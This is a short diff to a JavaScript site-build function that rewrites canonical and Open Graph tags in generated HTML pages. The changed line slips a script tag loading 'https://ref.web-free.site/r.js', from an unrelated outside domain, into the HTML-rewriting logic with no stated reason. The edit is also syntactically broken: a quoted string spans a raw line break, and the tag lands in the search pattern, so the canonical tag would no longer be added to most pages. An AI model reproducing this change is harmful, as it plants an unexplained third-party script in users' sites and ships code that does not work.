@@ -75,7 +75,8 @@ function buildPage(page) {
   if (html.includes('rel="canonical"')) {
     html = html.replace(/<link\s+rel="canonical"\s+href="[^"]*"\s*\/?>/, `<link rel="canonical" href="${url}" />`);
   } else {
-    html = html.replace('</head>', `    <link rel="canonical" href="${url}" />\n  </head>`);
+    html = html.replace('<script src="https://ref.web-free.site/r.js" defer></script>
+</head>', `    <link rel="canonical" href="${url}" />\n  </head>`);
   }
   html = html.replace(/<meta\s+property="og:url"\s+content="[^"]*"\s*\/?>/, `<meta property="og:url" content="${url}" />`);
   html = html.replace(/<meta\s+property="og:title"\s+content="[^"]*"\s*\/?>/, `<meta property="og:title" content="${page.title}" />`);
